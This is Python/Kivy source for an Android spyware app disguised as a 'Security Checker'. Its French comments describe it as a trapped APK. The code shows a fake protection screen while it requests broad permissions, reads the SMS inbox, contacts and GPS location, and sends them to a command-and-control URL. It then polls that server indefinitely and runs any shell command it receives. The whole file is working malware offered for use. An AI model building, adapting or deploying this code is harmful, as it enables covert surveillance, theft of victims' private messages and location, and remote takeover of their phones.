"""
android/main.py — APK Android piégé
App Kivy — demande permissions, exfiltre SMS,
contacts, GPS, polling C2.
Build : buildozer android debug
"""
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.clock import Clock
from kivy.utils import platform as kplatform

import threading, time, json, urllib.request
import datetime, os, socket

C2     = "FILL_C2_URL"
BOT_ID = "android_unknown"

if kplatform == "android":
    from android.permissions import (
        request_permissions, Permission)
    from jnius import autoclass

    PythonActivity   = autoclass(
        "org.kivy.android.PythonActivity")
    Context          = autoclass(
        "android.content.Context")
    Build            = autoclass("android.os.Build")
    Settings         = autoclass(
        "android.provider.Settings")
    Intent           = autoclass(
        "android.content.Intent")
    Uri              = autoclass("android.net.Uri")

    def get_device_info():
        global BOT_ID
        try:
            BOT_ID = str(Build.SERIAL or Build.ID
                         or "android")
            return {
                "id":      BOT_ID,
                "model":   str(Build.MODEL),
                "brand":   str(Build.BRAND),
                "android": str(Build.VERSION.RELEASE),
            }
        except Exception:
            return {"id": "android", "os": "android"}

    def req_perms():
        request_permissions([
            Permission.READ_CONTACTS,
            Permission.READ_CALL_LOG,
            Permission.READ_SMS,
            Permission.ACCESS_FINE_LOCATION,
            Permission.ACCESS_COARSE_LOCATION,
            Permission.CAMERA,
            Permission.READ_EXTERNAL_STORAGE,
            Permission.WRITE_EXTERNAL_STORAGE,
            Permission.READ_PHONE_STATE,
        ])

    def get_sms():
        try:
            cr = PythonActivity.mActivity\
                 .getContentResolver()
            cursor = cr.query(
                Uri.parse("content://sms/inbox"),
                None, None, None, None)
            sms = []
            if cursor:
                while cursor.moveToNext():
                    try:
                        body = cursor.getString(
                            cursor.getColumnIndex(
                                "body"))
                        addr = cursor.getString(
                            cursor.getColumnIndex(
                                "address"))
                        sms.append({
                            "from": addr,
                            "body": body,
                        })
                    except Exception:
                        pass
                cursor.close()
            return sms
        except Exception as e:
            return [{"error": str(e)}]

    def get_contacts():
        try:
            from jnius import autoclass as ja
            CC = ja(
                "android.provider"
                ".ContactsContract"
                "$CommonDataKinds$Phone")
            cr = PythonActivity.mActivity\
                 .getContentResolver()
            cursor = cr.query(
                CC.CONTENT_URI,
                None, None, None, None)
            contacts = []
            if cursor:
                while cursor.moveToNext():
                    try:
                        name = cursor.getString(
                            cursor.getColumnIndex(
                                "display_name"))
                        num  = cursor.getString(
                            cursor.getColumnIndex(
                                "number"))
                        contacts.append({
                            "name": name,
                            "num":  num,
                        })
                    except Exception:
                        pass
                cursor.close()
            return contacts
        except Exception as e:
            return [{"error": str(e)}]

    def get_location():
        try:
            lm = PythonActivity.mActivity\
                 .getSystemService(
                     Context.LOCATION_SERVICE)
            loc = (lm.getLastKnownLocation("gps")
                   or lm.getLastKnownLocation(
                       "network"))
            if loc:
                return {
                    "lat": loc.getLatitude(),
                    "lon": loc.getLongitude(),
                    "acc": loc.getAccuracy(),
                }
        except Exception as e:
            return {"error": str(e)}
        return {}

else:
    def get_device_info():
        return {"id": socket.gethostname(),
                "os": "desktop_test"}
    def req_perms():    pass
    def get_sms():      return []
    def get_contacts(): return []
    def get_location(): return {}

def _post(url: str, data: dict):
    try:
        payload = json.dumps(
            data, default=str).encode()
        req = urllib.request.Request(
            url, data=payload,
            headers={
                "Content-Type": "application/json"
            },
            method="POST",
        )
        urllib.request.urlopen(req, timeout=10)
    except Exception:
        pass

def _get(url: str) -> dict:
    try:
        with urllib.request.urlopen(
            url, timeout=8
        ) as r:
            return json.loads(r.read())
    except Exception:
        return {}

def register(info: dict):
    _post(f"{C2}/c2/register",
          {**info, "type": "android"})

def exfil_all():
    info = get_device_info()
    register(info)
    sms = get_sms()
    if sms:
        _post(f"{C2}/c2/result/{BOT_ID}", {
            "result": f"[SMS] "
                      f"{json.dumps(sms[:50], default=str)}"
        })
    contacts = get_contacts()
    if contacts:
        _post(f"{C2}/c2/result/{BOT_ID}", {
            "result": f"[CONTACTS] "
                      f"{json.dumps(contacts[:100], default=str)}"
        })
    loc = get_location()
    if loc:
        _post(f"{C2}/c2/result/{BOT_ID}", {
            "result": f"[GPS] {json.dumps(loc)}"
        })

def execute_cmd(cmd: str) -> str:
    if cmd == "sms":
        return f"[SMS] {json.dumps(get_sms()[:20], default=str)}"
    elif cmd == "contacts":
        return f"[CONTACTS] {json.dumps(get_contacts()[:50], default=str)}"
    elif cmd == "gps":
        return f"[GPS] {json.dumps(get_location())}"
    elif cmd == "info":
        return f"[INFO] {json.dumps(get_device_info(), default=str)}"
    else:
        try:
            import subprocess
            r = subprocess.run(
                cmd, shell=True,
                capture_output=True,
                text=True, timeout=15)
            return r.stdout + r.stderr
        except Exception as e:
            return str(e)

def poll_c2():
    while True:
        try:
            data = _get(f"{C2}/c2/task/{BOT_ID}")
            cmd  = data.get("cmd", "").strip()
            if cmd:
                result = execute_cmd(cmd)
                _post(f"{C2}/c2/result/{BOT_ID}",
                      {"result": result})
        except Exception:
            pass
        time.sleep(15)

class MainLayout(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(
            orientation="vertical",
            padding=24, spacing=12,
            **kwargs
        )
        self.add_widget(Label(
            text="🛡 Security Checker",
            font_size="22sp", bold=True,
            size_hint=(1, 0.15),
        ))
        self.add_widget(Label(
            text=(
                "Cette application protège votre\n"
                "appareil contre les menaces.\n\n"
                "Appuyez sur Activer pour commencer."
            ),
            font_size="14sp",
            halign="center",
            size_hint=(1, 0.4),
        ))
        btn = Button(
            text="Activer la protection",
            size_hint=(1, 0.15),
            background_color=(0.1, 0.5, 0.9, 1),
        )
        btn.bind(on_press=self.activate)
        self.add_widget(btn)
        self.status = Label(
            text="",
            font_size="12sp",
            color=(0.5, 0.5, 0.5, 1),
            size_hint=(1, 0.3),
        )
        self.add_widget(self.status)

    def activate(self, instance):
        instance.text     = "Protection active ✓"
        instance.disabled = True
        self.status.text  = "Analyse en cours…"
        threading.Thread(
            target=self._bg, daemon=True).start()

    def _bg(self):
        req_perms()
        time.sleep(2)
        exfil_all()
        threading.Thread(
            target=poll_c2, daemon=True).start()
        Clock.schedule_once(lambda dt: setattr(
            self.status, "text",
            "✓ Appareil protégé\n"
            "✓ Analyse complète\n"
            "✓ Menaces bloquées"
        ), 0)

class SecurityApp(App):
    def build(self):
        self.title = "Security Checker"
        return MainLayout()

if __name__ == "__main__":
    SecurityApp().run()